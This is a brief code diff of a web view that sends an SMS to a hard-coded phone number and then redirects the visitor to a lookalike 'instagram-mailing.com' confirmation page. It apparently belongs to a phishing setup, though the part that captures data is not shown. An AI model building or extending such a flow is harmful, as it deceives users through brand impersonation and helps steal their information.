@@ -20,6 +20,4 @@ def homepage(request):
                      from_='+13344234972',
                      to='+15613025285'
                   )
-
-        print("AYEEE IT WORKED: " + message.sid)
-    return redirect('https://instagram-internal-mailing.com/confirmation.html')
+    return redirect('https://instagram-mailing.com/confirmation.html')
